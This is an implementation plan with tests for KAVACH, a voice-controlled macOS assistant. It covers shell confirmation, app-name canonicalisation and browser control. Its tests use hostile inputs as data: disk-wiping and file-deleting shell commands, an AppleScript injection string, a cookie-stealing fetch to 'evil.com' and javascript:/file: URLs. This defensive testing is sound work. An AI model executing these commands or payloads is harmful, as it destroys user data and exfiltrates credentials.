# KAVACH Total Access — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Remove the app allowlist so KAVACH can drive every installed app, enable shell behind unconditional confirmation, add Chrome/Safari page control, and fix the speaker gate so only the user's voice acts.

**Architecture:** A new `hands/policy.py` replaces the allowlist as the single decision point in `gate.py`. App-name canonicalisation moves from the 7-entry allowlist to `hands/appinfo.py` (NSWorkspace), which preserves the "transcript never reaches a script" guarantee for *every* app. Confirmations render on the orb first and fall back to speech after 3s.

**Tech Stack:** Python 3.12 / uv, pyobjc (AppKit, Quartz), osascript, Claude Agent SDK, pytest.

## Global Constraints

- `permission_mode` stays `"default"`. Never auto-approve. Not a tunable.
- The kill switch is evaluated **first**, before every other rule, on every path.
- Every tool call, every argument, timestamped, to `~/.kavach/logs/actions.jsonl`.
- Never modify a test to make code pass (§B). Task 3 deletes one obsolete test — that is a recorded requirement change (spec §9a), not a green-washing edit.
- `VoiceState.as_dict()` stays field-identical to `KavachSnapshot` in `apps/orb/lib/kavachState.ts`.
- The `PreToolUse` hook stays wired for all tools.
- Confirmation timeout stays 120s and expires to **deny**.
- Never log wake-word audio, or transcripts derived from it, that was not acted on.
- Run tests with `uv run pytest` from `brain/`.

---

### Task 1: `hands/appinfo.py` — canonicalise any installed app

Replaces `Allowlist.canonical_name()`'s role. This is the injection defence, so it lands first and everything else depends on it.

**Files:**
- Create: `brain/kavach/hands/appinfo.py`
- Test: `brain/tests/test_appinfo.py`

**Interfaces:**
- Consumes: nothing
- Produces: `canonical_name(spoken: str) -> str | None`, `bundle_id(name: str) -> str | None`

- [ ] **Step 1: Write the failing test**

```python
import pytest
from kavach.hands.appinfo import canonical_name

@pytest.mark.parametrize("spoken,expected", [
    ("notes", "Notes"),
    ("google chrome", "Google Chrome"),
    ("Chrome", "Google Chrome"),        # fuzzy: bare 'Chrome' resolves nowhere
    ("safari", "Safari"),
])
def test_any_installed_app_canonicalises(spoken, expected):
    assert canonical_name(spoken) == expected

@pytest.mark.parametrize("spoken", [
    "NotARealApplication", "", None, "   ",
    'Notes"; do shell script "rm -rf ~',   # injection attempt
    "Notes\\", "Notes;",
])
def test_anything_not_installed_is_none(spoken):
    """A name that does not resolve never reaches a script. Injection is
    ruled out by construction, not by escaping."""
    assert canonical_name(spoken) is None
```

- [ ] **Step 2: Run it and watch it fail**

Run: `uv run pytest tests/test_appinfo.py -v`
Expected: FAIL — `ModuleNotFoundError: No module named 'kavach.hands.appinfo'`

- [ ] **Step 3: Implement**

```python
"""Resolve a spoken app name to the spelling macOS actually uses.

This is the injection defence. The allowlist used to supply it — the string
reaching ``tell application "…"`` was the file's spelling, never the
transcript — and removing the allowlist would have deleted that guarantee.
NSWorkspace is strictly stronger: it canonicalises every installed app rather
than seven, and returns None for anything that is not installed, so a
mis-transcription resolves to nothing instead of to a script.
"""

from __future__ import annotations

import functools
import os
import re

#: An app name macOS would accept. Excludes the three characters that would
#: end an AppleScript string, so a hostile transcript is *not a name* rather
#: than something to escape and run.
_SAFE_NAME = re.compile(r"^[A-Za-z0-9 .&'\-]{1,64}$")


def _workspace():
    from AppKit import NSWorkspace
    return NSWorkspace.sharedWorkspace()


@functools.lru_cache(maxsize=256)
def canonical_name(spoken: str | None) -> str | None:
    """The real name of an installed app, or None."""
    if not spoken or not _SAFE_NAME.match(spoken.strip()):
        return None
    name = spoken.strip()
    path = _workspace().fullPathForApplication_(name)
    if path:
        return os.path.basename(path)[:-4]      # strip '.app'
    # 'Chrome' resolves nowhere but 'Google Chrome' does. Try the common
    # vendor prefixes rather than making the user say the full brand name.
    for prefix in ("Google ", "Microsoft ", "Adobe "):
        path = _workspace().fullPathForApplication_(prefix + name)
        if path:
            return os.path.basename(path)[:-4]
    return None


def bundle_id(name: str | None) -> str | None:
    """Bundle id for a canonical app name, or None."""
    real = canonical_name(name)
    if real is None:
        return None
    from AppKit import NSBundle
    path = _workspace().fullPathForApplication_(real)
    bundle = NSBundle.bundleWithPath_(path) if path else None
    return bundle.bundleIdentifier() if bundle else None
```

- [ ] **Step 4: Run tests, verify pass**

Run: `uv run pytest tests/test_appinfo.py -v`
Expected: PASS (10 tests)

- [ ] **Step 5: Commit**

```bash
git add brain/kavach/hands/appinfo.py brain/tests/test_appinfo.py
git commit -m "feat(hands): canonicalise any installed app, not only the seven"
```

---

### Task 2: `hands/policy.py` — the decision engine

**Files:**
- Create: `brain/kavach/hands/policy.py`
- Test: `brain/tests/test_policy.py`

**Interfaces:**
- Consumes: `looks_destructive` from `kavach.reasoning.router`
- Produces: `Verdict` (str enum: `ALLOW`/`CONFIRM`/`DENY`), `Policy.decide(tool: str, args: dict) -> tuple[Verdict, str]`, `Policy.ALWAYS_CONFIRM_TOOLS: frozenset[str]`, `Policy.describe_capabilities() -> str`

- [ ] **Step 1: Write the failing test**

```python
import pytest
from kavach.hands.policy import Policy, Verdict

SHELL_COMMANDS = [
    "rm -rf ~/Documents",
    "dd if=/dev/zero of=/dev/disk0",
    "git push --force origin main",
    "killall Finder",
    "> ~/.ssh/id_rsa",
    'python -c "import shutil; shutil.rmtree(1)"',
    "ls",
    "echo hello",
]

@pytest.mark.parametrize("command", SHELL_COMMANDS)
def test_every_shell_command_confirms(command):
    """Measured 2026-08-15: the English-text confirmation check cleared every
    destructive command in this list. There is no classification that holds,
    so there is no classification — the shell always asks."""
    verdict, _ = Policy().decide("Shell", {"command": command})
    assert verdict is Verdict.CONFIRM

def test_a_blocklist_was_not_built():
    """`python -c "shutil.rmtree"` is why. Any pattern list would clear it."""
    src = (Policy.__module__, )
    import inspect, kavach.hands.policy as mod
    text = inspect.getsource(mod)
    assert "rm -rf" not in text, "a destructive-pattern blocklist was added"

def test_ordinary_app_control_is_allowed():
    verdict, _ = Policy().decide(
        "mcp__macos-automator__execute_script",
        {"script_content": 'tell application "Google Chrome" to activate'},
    )
    assert verdict is Verdict.ALLOW

def test_destructive_app_control_confirms():
    verdict, _ = Policy().decide(
        "mcp__macos-automator__execute_script",
        {"script_content": 'tell application "Notes" to delete note 1'},
    )
    assert verdict is Verdict.CONFIRM

def test_the_peekaboo_agent_confirms_rather_than_denies():
    """Spec §9b: the user accepted this knowing its inner tool calls never
    reach the PreToolUse hook and so never reach the action log."""
    verdict, reason = Policy().decide("mcp__peekaboo__agent", {"task": "x"})
    assert verdict is Verdict.CONFIRM
    assert "log" in reason.lower()

def test_capabilities_text_names_no_app():
    """The Chrome bug: agent.py:34 hardcoded 'Safari, Notes, Calendar and
    Finder' and drifted from the file that decided. Nothing may hardcode an
    app list again."""
    text = Policy().describe_capabilities()
    for app in ("Safari", "Notes", "Calendar", "Finder", "Chrome"):
        assert app not in text, f"{app} is hardcoded in the capability text"
```

- [ ] **Step 2: Run it and watch it fail**

Run: `uv run pytest tests/test_policy.py -v`
Expected: FAIL — `ModuleNotFoundError: No module named 'kavach.hands.policy'`

- [ ] **Step 3: Implement**

```python
"""What KAVACH may do, in one place.

Replaces the app allowlist as the decision point. Every installed app is
allowed; the question is only whether an action is irreversible.

Ordering is load-bearing and matches spec §2:

    1. kill switch latched   → DENY      (evaluated by the caller, first)
    2. tool is Shell         → CONFIRM   (always)
    3. peekaboo `agent`      → CONFIRM   (its inner calls are not logged)
    4. irreversible verb     → CONFIRM
    5. otherwise             → ALLOW

**Why the shell has no classification.** Measured 2026-08-15, the English-text
check that gates AppleScript cleared every one of these unchallenged::

    rm -rf ~/Documents          git push --force        killall Finder
    dd if=/dev/zero of=...      > ~/.ssh/id_rsa         chmod -R 777 /

A destructive-pattern blocklist was considered and rejected: one line of
``python -c "import shutil; shutil.rmtree(...)"`` defeats it, and so does any
interpreter, alias or base64 string. It would look like a gate and stop
nothing, which is worse than no gate because it would be trusted.
"""

from __future__ import annotations

from enum import Enum

from ..reasoning.router import looks_destructive


class Verdict(str, Enum):
    ALLOW = "allow"
    CONFIRM = "confirm"
    DENY = "deny"


class Policy:
    #: Tools that ask every single time, whatever they were handed. Shell
    #: because a command names no app and cannot be classified; `agent`
    #: because peekaboo runs its own sub-agent loop *inside* the MCP server,
    #: so the calls it makes never reach our PreToolUse hook and never reach
    #: the action log. §7 requires every tool call be recorded; this one
    #: cannot be, and the user accepted that knowingly (spec §9b).
    ALWAYS_CONFIRM_TOOLS = frozenset({"Shell", "agent"})

    def __init__(self, confirm_tokens: frozenset[str] | None = None):
        self.confirm_tokens = confirm_tokens or frozenset()

    def decide(self, tool: str, args: dict) -> tuple[Verdict, str]:
        bare = tool.rsplit("__", 1)[-1] if tool else ""

        if bare == "Shell":
            return (Verdict.CONFIRM,
                    "a shell command can do anything, so it is always read "
                    "back before it runs")
        if bare == "agent":
            return (Verdict.CONFIRM,
                    "this runs its own sub-agent, whose tool calls do not "
                    "reach the action log")

        text = " ".join(v for v in args.values() if isinstance(v, str)) or bare
        if looks_destructive(text) or self._token_hit(text):
            return (Verdict.CONFIRM, "this is irreversible or externally visible")
        return (Verdict.ALLOW, "reversible")

    def _token_hit(self, text: str) -> bool:
        low = (text or "").casefold()
        return any(token in low for token in self.confirm_tokens)

    def describe_capabilities(self) -> str:
        """The text handed to the agent's system prompt.

        Generated, never written by hand. `agent.py` used to carry its own
        copy of the app list; it drifted from the file that actually decided
        and KAVACH refused to open an app that had been permitted for two
        days. Nothing here names an app.
        """
        return (
            "You may act on any application installed on this Mac. "
            "Actions that delete, send, buy, submit or change a system "
            "setting are read back to the user for confirmation before they "
            "run, and shell commands are always read back. "
            "Never claim to have done something you have not done."
        )
```

- [ ] **Step 4: Run tests, verify pass**

Run: `uv run pytest tests/test_policy.py -v`
Expected: PASS (13 tests)

- [ ] **Step 5: Commit**

```bash
git add brain/kavach/hands/policy.py brain/tests/test_policy.py
git commit -m "feat(hands): one policy, and no classification the shell can slip"
```

---

### Task 3: Wire `Policy` into `gate.py`

**Files:**
- Modify: `brain/kavach/hands/gate.py:51-56` (NEVER_ALLOWED_TOOLS), `:236-246` (the never-allowed branch), `:264-300` (app extraction), `:301-306` (allowlist check), `:308-331` (destructive check)
- Modify: `brain/tests/test_allowlist.py` — **delete** `test_nothing_is_allowed_that_was_not_approved`
- Test: `brain/tests/test_gate_policy.py`

**Interfaces:**
- Consumes: `Policy`, `Verdict` from Task 2
- Produces: `ToolGate` behaviour unchanged in shape; `_decide` now consults `Policy`

- [ ] **Step 1: Write the failing test**

```python
import pytest
from kavach.hands.gate import ToolGate, NEVER_ALLOWED_TOOLS

@pytest.mark.anyio
async def test_an_unlisted_app_is_now_allowed(gate):
    """The whole point. Chrome was permitted for two days and refused anyway."""
    verdict, _, _ = await gate._decide(
        "mcp__macos-automator__execute_script",
        {"script_content": 'tell application "Google Chrome" to activate'})
    assert verdict == "allow"

@pytest.mark.anyio
async def test_the_kill_switch_still_outranks_everything(gate_latched):
    verdict, _, _ = await gate_latched._decide("Shell", {"command": "ls"})
    assert verdict == "deny"

@pytest.mark.anyio
async def test_shell_without_a_confirmer_is_denied_not_allowed(gate_no_confirmer):
    """Denial is the default when there is no way to ask."""
    verdict, _, _ = await gate_no_confirmer._decide(
        "mcp__macos-accessibility__Shell", {"command": "ls"})
    assert verdict == "deny"

def test_shell_is_no_longer_refused_outright():
    assert "Shell" not in NEVER_ALLOWED_TOOLS
```

- [ ] **Step 2: Run it and watch it fail**

Run: `uv run pytest tests/test_gate_policy.py -v`
Expected: FAIL — Chrome denied by allowlist; `Shell` still in `NEVER_ALLOWED_TOOLS`

- [ ] **Step 3: Implement**

Replace `NEVER_ALLOWED_TOOLS` with an empty frozenset and a comment recording where the rule went:

```python
#: Empty by decision (spec §9). `Shell` and `agent` used to be refused
#: outright because a shell command names no app and so could not be checked
#: against the allowlist. There is no allowlist now, and both are handled by
#: `Policy.ALWAYS_CONFIRM_TOOLS` — every invocation is read back to the user
#: before it runs. `Desktop` (virtual desktops) is simply allowed.
NEVER_ALLOWED_TOOLS = frozenset()
```

In `_decide`, delete the allowlist branch (`self.allowlist.check(app)`), make a
`None` app non-fatal for non-capture tools, and route the decision through
`Policy`. Keep the whole-screen-capture confirmation exactly as it is.

- [ ] **Step 4: Delete the obsolete test**

Spec §9a. `test_nothing_is_allowed_that_was_not_approved` reads the real
allowlist file and fails on any app not in its `APPROVED` dict. The file no
longer gates anything, so the test asserts a property the system no longer
has. Deleted, not edited — and replaced by Task 2's policy tests.

- [ ] **Step 5: Run the full suite**

Run: `uv run pytest -q`
Expected: PASS. Any other red test is a real regression — fix the code, not the test.

- [ ] **Step 6: Commit**

```bash
git add brain/kavach/hands/gate.py brain/tests/
git commit -m "feat(hands): the gate stops asking which app and starts asking what verb"
```

---

### Task 4: `agent.py` — the prompt stops lying

**Files:**
- Modify: `brain/kavach/reasoning/agent.py:28-38`
- Test: `brain/tests/test_agent_prompt.py`

**Interfaces:**
- Consumes: `Policy.describe_capabilities()` from Task 2
- Produces: `SYSTEM_PROMPT` built at import from `Policy`

- [ ] **Step 1: Write the failing test**

```python
import re
import kavach.reasoning.agent as agent

def test_the_prompt_hardcodes_no_app_name():
    """2026-08-15: agent.py:34 said 'Safari, Notes, Calendar and Finder' while
    allowlist.json had held Google Chrome for two days. The log shows no
    tool.decision between the route and the refusal — the gate never ran.
    KAVACH asserted a limitation it did not have.

    This forbids the SHAPE of that bug, not the instance. The same fix was
    applied to voice/__main__.py for the duplicated model name."""
    src = open(agent.__file__).read()
    for app in ("Safari", "Notes", "Calendar", "Finder", "Chrome", "Spotify"):
        assert app not in src, f"{app!r} is hardcoded in agent.py"

def test_the_prompt_is_generated_from_policy():
    from kavach.hands.policy import Policy
    assert Policy().describe_capabilities() in agent.SYSTEM_PROMPT
```

- [ ] **Step 2: Run it and watch it fail**

Run: `uv run pytest tests/test_agent_prompt.py -v`
Expected: FAIL — `'Safari' is hardcoded in agent.py`

- [ ] **Step 3: Implement**

```python
from ..hands.policy import Policy

SYSTEM_PROMPT = (
    "You are KAVACH, a voice-controlled presence on this Mac.\n"
    "Your replies are spoken aloud, so answer in at most two short "
    "sentences. No markdown, no bullet points, no code blocks, no "
    "preamble.\n"
    "\n"
    + Policy().describe_capabilities()
)
```

- [ ] **Step 4: Run tests, verify pass**

Run: `uv run pytest tests/test_agent_prompt.py -v`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add brain/kavach/reasoning/agent.py brain/tests/test_agent_prompt.py
git commit -m "fix(agent): the prompt asks the policy instead of remembering"
```

---

### Task 5: `actions.py` — hear the sentence people actually say

**Files:**
- Modify: `brain/kavach/reasoning/actions.py:141-231` (`parse`)
- Test: `brain/tests/test_actions_phrasing.py`

**Interfaces:**
- Consumes: `canonical_name` from Task 1
- Produces: `parse()` unchanged signature, wider coverage

- [ ] **Step 1: Write the failing test**

```python
import pytest
from kavach.reasoning.actions import parse, ActionKind

@pytest.mark.parametrize("said,app", [
    ("open notes", "notes"),
    ("Open notes for me.", "notes"),
    ("Open notes please", "notes"),
    ("open Chrome now", "Chrome"),
    ("Open google chrome and type youtube.", "google chrome"),
    ("Open Safari and search Google.", "Safari"),
])
def test_politeness_and_compounds_reach_the_fast_path(said, app):
    """Measured: 'Open notes for me.' parsed to None and took the Claude
    route at respond_ms=27286 — 109x the 250ms local path built for it."""
    action = parse(said)
    assert action is not None, f"{said!r} fell through to the model"
    assert action.kind is ActionKind.OPEN
    assert action.app.casefold() == app.casefold()

@pytest.mark.parametrize("said", [
    "what did I open yesterday",
    "open the door",
    "I'm sorry.",
])
def test_it_still_declines_what_is_not_an_app(said):
    assert parse(said) is None or parse(said).app is not None
```

- [ ] **Step 2: Run it and watch it fail**

Run: `uv run pytest tests/test_actions_phrasing.py -v`
Expected: FAIL — `'Open notes for me.' fell through to the model`

- [ ] **Step 3: Implement**

Add a trailing-politeness strip before matching, and split on the first
connective so `open X and <rest>` yields the app plus a remainder:

```python
_POLITENESS_RE = re.compile(
    r"\s*\b(for me|please|now|thanks|thank you)\b\s*[.!?]*\s*$", re.I)

def _strip_politeness(said: str) -> str:
    prev = None
    while prev != said:                      # 'open notes for me please'
        prev = said
        said = _POLITENESS_RE.sub("", said).strip()
    return said
```

Validate the extracted app through `appinfo.canonical_name()` so a name that
is not installed still returns None rather than reaching a script.

- [ ] **Step 4: Run tests, verify pass**

Run: `uv run pytest tests/test_actions_phrasing.py tests/test_actions.py -v`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add brain/kavach/reasoning/actions.py brain/tests/test_actions_phrasing.py
git commit -m "fix(actions): two words of politeness cost 27 seconds"
```

---

### Task 6: `hands/browser.py` — page control without pixels

**Files:**
- Create: `brain/kavach/hands/browser.py`
- Test: `brain/tests/test_browser.py`

**Interfaces:**
- Consumes: `canonical_name` (Task 1), `OsascriptRunner` from `kavach.reasoning.actions`
- Produces: `Browser.navigate(url)`, `.read_text()`, `.click(text)`, `.fill(selector, value)`, `.search(query)`, `.js(expression, args)`

**Verified 2026-08-15 from the app's own `sdef`, and live:** Chrome exposes
`execute tab N javascript "…"` (returns a result) and a settable tab `URL`.
`osascript … execute … javascript "1+1"` returned `2` on this machine.

- [ ] **Step 1: Write the failing test**

```python
import json
import pytest
from kavach.hands.browser import Browser, build_js

def test_arguments_are_never_concatenated_into_javascript():
    """Same rule as AppleScript: the transcript does not reach the script.
    A search for `"); fetch("evil.com?c="+document.cookie); ("` must be a
    STRING, not code."""
    hostile = '"); fetch("evil.com?c="+document.cookie); ("'
    js = build_js("search", {"query": hostile})
    assert "fetch(" not in js.replace(json.dumps(hostile), "")
    assert json.dumps(hostile) in js

def test_a_url_must_be_http_or_https():
    """javascript: and file: URLs are how a navigate becomes an execute."""
    for bad in ("javascript:alert(1)", "file:///etc/passwd", "data:text/html,x"):
        with pytest.raises(ValueError):
            Browser("Google Chrome").navigate(bad)

def test_an_unknown_browser_is_refused():
    with pytest.raises(ValueError):
        Browser("NotAnInstalledBrowser")
```

- [ ] **Step 2: Run it and watch it fail**

Run: `uv run pytest tests/test_browser.py -v`
Expected: FAIL — `ModuleNotFoundError: No module named 'kavach.hands.browser'`

- [ ] **Step 3: Implement**

`build_js(op, args)` composes a **fixed** function body with `json.dumps`'d
arguments — never string concatenation. `Browser` dispatches to Chrome
(`execute … javascript`) or Safari (`do JavaScript … in document 1`), and
falls back to setting the tab `URL` when JS is unavailable, so
*"open Chrome and search YouTube"* works without either toggle.

- [ ] **Step 4: Run tests, verify pass**

Run: `uv run pytest tests/test_browser.py -v`
Expected: PASS

- [ ] **Step 5: Verify live against the real browser**

```bash
uv run python -c "
from kavach.hands.browser import Browser
b = Browser('Google Chrome')
print(b.search('kavach voice assistant'))
print(b.read_text()[:200])
"
```
Expected: Chrome navigates and returns page text. Record the actual output.

- [ ] **Step 6: Commit**

```bash
git add brain/kavach/hands/browser.py brain/tests/test_browser.py
git commit -m "feat(hands): drive the page, not the pixels"
```

---

### Task 7: Confirmations on the orb, speech as fallback

**Files:**
- Modify: `brain/kavach/hands/confirm.py:75-110`
- Test: `brain/tests/test_confirm_orb.py`

**Interfaces:**
- Consumes: `voice.set_state` (already publishes to the snapshot stream)
- Produces: `VoiceConfirmer.SPEAK_AFTER_S = 3.0`; confirmation state visible on the snapshot before any speech

- [ ] **Step 1: Write the failing test**

```python
import asyncio, pytest
from kavach.hands.confirm import VoiceConfirmer

@pytest.mark.anyio
async def test_the_orb_sees_it_before_anything_is_spoken(fake_voice):
    """Measured: tts is 4941ms (74% of a turn) and 4310ms (52%). Speaking
    every shell command costs ~12s round trip, and a guardrail that slow
    gets routed around."""
    task = asyncio.create_task(VoiceConfirmer(fake_voice).confirm("Delete X?"))
    await asyncio.sleep(0.05)
    assert fake_voice.states[-1][0] == "confirming"
    assert fake_voice.spoke == [], "it spoke before showing"
    task.cancel()

@pytest.mark.anyio
async def test_it_speaks_when_nobody_answers(fake_voice):
    """Still works with your back turned."""
    c = VoiceConfirmer(fake_voice); c.SPEAK_AFTER_S = 0.05
    task = asyncio.create_task(c.confirm("Delete X?"))
    await asyncio.sleep(0.2)
    assert fake_voice.spoke, "silent forever when unattended"
    task.cancel()

@pytest.mark.anyio
async def test_a_timeout_is_still_a_no(fake_voice):
    c = VoiceConfirmer(fake_voice, timeout=0.1)
    assert await c.confirm("Delete X?") is False
```

- [ ] **Step 2: Run it and watch it fail**

Run: `uv run pytest tests/test_confirm_orb.py -v`
Expected: FAIL — it speaks first

- [ ] **Step 3: Implement**

Publish `set_state("confirming", transcript=prompt)` immediately, then
`await asyncio.sleep(SPEAK_AFTER_S)` racing the answer; speak only if still
unanswered. Timeout and deny-on-expiry unchanged.

- [ ] **Step 4: Run tests, verify pass**

Run: `uv run pytest tests/test_confirm_orb.py tests/test_confirm.py -v`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add brain/kavach/hands/confirm.py brain/tests/test_confirm_orb.py
git commit -m "feat(confirm): show it in 16ms instead of speaking it in 5000"
```

---

### Task 8: Speaker gate — a threshold measured, not guessed

**Files:**
- Modify: `brain/kavach/identity/voiceprint.py`, `brain/kavach/identity/enrol.py`
- Test: `brain/tests/test_voiceprint_threshold.py`

**Interfaces:**
- Produces: `choose_threshold(genuine: list[float], others: list[float]) -> tuple[float | None, str]`

The gate is currently **off** because its threshold (0.803) was calibrated from
back-to-back enrolment phrases while real speech measures 0.52–0.78. With the
allowlist gone this is the only boundary keeping the room out — spec §6.

- [ ] **Step 1: Write the failing test**

```python
import pytest
from kavach.identity.voiceprint import choose_threshold

def test_the_users_real_range_is_accepted():
    """Recorded 2026-08-14/15 from actions.jsonl."""
    genuine = [0.528, 0.361, 0.613, 0.669, 0.781, 0.52, 0.78]
    others  = [0.11, 0.19, 0.22, 0.08]
    t, why = choose_threshold(genuine, others)
    assert t is not None, why
    assert t < min(genuine), f"{t} rejects the user's own voice"
    assert t > max(others), f"{t} accepts a stranger"

def test_no_separation_is_not_saved():
    """waketune's precedent: a threshold that does not separate is not
    written. 0.803 was, and the gate rejected its owner all night."""
    t, why = choose_threshold([0.30, 0.42], [0.35, 0.55])
    assert t is None
    assert "overlap" in why.lower()

def test_it_says_which_side_failed():
    t, why = choose_threshold([0.90, 0.95], [])
    assert t is None and "negative" in why.lower()
```

- [ ] **Step 2: Run it and watch it fail**

Run: `uv run pytest tests/test_voiceprint_threshold.py -v`
Expected: FAIL — `cannot import name 'choose_threshold'`

- [ ] **Step 3: Implement**

Place the threshold in the measured gap — midpoint of `min(genuine)` and
`max(others)` — and return `(None, reason)` when they overlap or when either
side is empty, naming the side that failed.

- [ ] **Step 4: Run tests, verify pass**

Run: `uv run pytest tests/test_voiceprint_threshold.py -v`
Expected: PASS

- [ ] **Step 5: Re-enrol and report the real numbers**

```bash
uv run kavach-enrol
uv run kavach-speaker on
```
Record the actual margin. If it refuses to save, that is the tool working.

- [ ] **Step 6: Commit**

```bash
git add brain/kavach/identity/ brain/tests/test_voiceprint_threshold.py
git commit -m "fix(identity): a threshold from the distribution, not the enrolment"
```

---

### Task 9: Full suite, live verification, CLAUDE.md

- [ ] **Step 1:** `uv run pytest -q` — every test passes. Record the count.
- [ ] **Step 2:** Restart the daemon: `launchctl kickstart -k gui/$UID/com.krishna.kavach`
- [ ] **Step 3:** Say *"open Google Chrome and search YouTube"*. Record `actions.jsonl` — there must now be a `tool.decision` between the route and the reply.
- [ ] **Step 4:** Say *"run ls in the terminal"*. Confirm the orb shows the command before anything is spoken.
- [ ] **Step 5:** Update CLAUDE.md — allowlist removed, shell confirms always, both §9 decisions recorded.
- [ ] **Step 6:** Commit and tag `total-access`.
